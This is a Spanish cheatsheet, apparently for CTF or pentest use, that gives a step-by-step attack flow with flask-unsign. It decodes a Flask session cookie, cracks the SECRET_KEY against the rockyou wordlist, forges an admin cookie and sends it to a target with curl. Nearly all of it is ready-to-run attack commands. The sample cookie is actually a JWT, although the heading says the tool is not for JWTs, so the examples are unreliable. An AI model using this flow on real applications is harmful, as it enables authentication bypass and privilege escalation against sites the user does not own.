# flask-unsign — cheatsheet
> Cookies de sesión Flask (no JWT)

## Instalación
```bash
pip install flask-unsign --break-system-packages
```

## Flujo de ataque

### 1. Decodificar cookie (ver contenido)
```bash
flask-unsign --decode --cookie 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjMiLCJuYW1lIjoiMTIzIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3ODc0MTg0MzIwODJ9.doZgQvD9FXqoyZVnPd8FG_RvSKBXvZyBhF3uLpqwqEo'
```

### 2. Crackear SECRET_KEY
### Ver solo que datos hay
```bash
flask-unsign --unsign --cookie 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjMiLCJuYW1lIjoiMTIzIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3ODc0MTg0MzIwODJ9.doZgQvD9FXqoyZVnPd8FG_RvSKBXvZyBhF3uLpqwqEo'
```
### Ver que hay y crakiar el secret
```bash
flask-unsign --unsign --cookie 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjMiLCJuYW1lIjoiMTIzIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3ODc0MTg0MzIwODJ9.doZgQvD9FXqoyZVnPd8FG_RvSKBXvZyBhF3uLpqwqEo' \
  --wordlist /usr/share/wordlists/rockyou.txt \
  --no-literal-eval
```

### Forjar cookie como admin
```bash
flask-unsign --sign \
  --cookie "{'username': 'admin', 'rol': 'true'}" \
  --secret 'SECRET_ENCONTRADA'
```

### Usar la cookie forjada
```bash
# Con curl
curl -H "Cookie: session=COOKIE_FORJADA" http://target/

# O en DevTools → Application → Cookies → editar valor
```